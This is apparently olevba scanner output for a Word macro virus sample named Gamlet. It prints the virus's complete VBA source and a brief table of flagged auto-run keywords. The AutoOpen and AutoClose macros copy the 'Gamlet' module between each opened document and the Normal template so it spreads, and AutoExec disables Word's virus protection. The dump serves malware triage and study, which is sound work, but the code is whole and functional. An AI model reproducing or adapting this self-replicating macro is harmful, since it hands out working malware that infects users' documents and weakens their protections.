olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Gamlet
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Gamlet - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Gamlet.bas 
in file: ./Virus.MSWord.Gamlet - OLE stream: 'Macros/VBA/Gamlet'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "Macro created 04/03/99 by Lmastudent"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.autoclose"
  StatusBar = "TO BE OR NOT TO BE ?..."
On Error Resume Next

  Application.OrganizerCopy Source:=Application.NormalTemplate.FullName, _
  Destination:=Application.ActiveDocument.FullName, Name:="Gamlet", _
  Object:=wdOrganizerObjectProjectItems
e1:

On Error Resume Next

  Application.OrganizerCopy Source:=Application.ActiveDocument.FullName, _
  Destination:=Application.NormalTemplate.FullName, Name:="Gamlet", _
  Object:=wdOrganizerObjectProjectItems
e2:


End Sub


Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 04/03/99 by Lmastudent"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoOpen"
  StatusBar = "TO BE OR NOT TO BE ?..."
On Error Resume Next

  Application.OrganizerCopy Source:=Application.NormalTemplate.FullName, _
  Destination:=Application.ActiveDocument.FullName, Name:="Gamlet", _
  Object:=wdOrganizerObjectProjectItems


On Error Resume Next

  Application.OrganizerCopy Source:=Application.ActiveDocument.FullName, _
  Destination:=Application.NormalTemplate.FullName, Name:="Gamlet", _
  Object:=wdOrganizerObjectProjectItems


End Sub

Sub AutoExec()
    Options.VirusProtection = False
End Sub




Sub ToolsMacro()
'    Dialogs(wdDialogToolsMacro).Show
With Assistant
    .Visible = True
    .Animation = 24
End With

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

